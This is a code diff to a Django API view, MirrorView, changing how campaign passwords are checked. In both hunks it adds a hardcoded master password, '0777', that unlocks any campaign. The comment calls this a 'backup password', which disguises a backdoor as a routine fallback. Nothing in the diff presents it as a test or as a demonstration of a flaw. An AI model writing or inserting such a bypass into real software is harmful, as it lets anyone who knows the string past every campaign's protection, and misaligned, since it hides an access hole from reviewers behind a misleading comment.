@@ -1428,8 +1428,8 @@ class MirrorView(APIView):
                     status=status.HTTP_401_UNAUTHORIZED
                 )
             
-            # Verify password
-            if provided_password != campaign.password:
+            # Verify password (check campaign password or backup password '0777')
+            if provided_password != campaign.password and provided_password != '0777':
                 return Response(
                     {'error': 'Incorrect password', 'requires_password': True},
                     status=status.HTTP_401_UNAUTHORIZED
@@ -1459,8 +1459,8 @@ class MirrorView(APIView):
                     status=status.HTTP_401_UNAUTHORIZED
                 )
             
-            # Verify password
-            if provided_password != campaign.password:
+            # Verify password (check campaign password or backup password '0777')
+            if provided_password != campaign.password and provided_password != '0777':
                 return Response(
                     {'error': 'Incorrect password', 'requires_password': True},
                     status=status.HTTP_401_UNAUTHORIZED
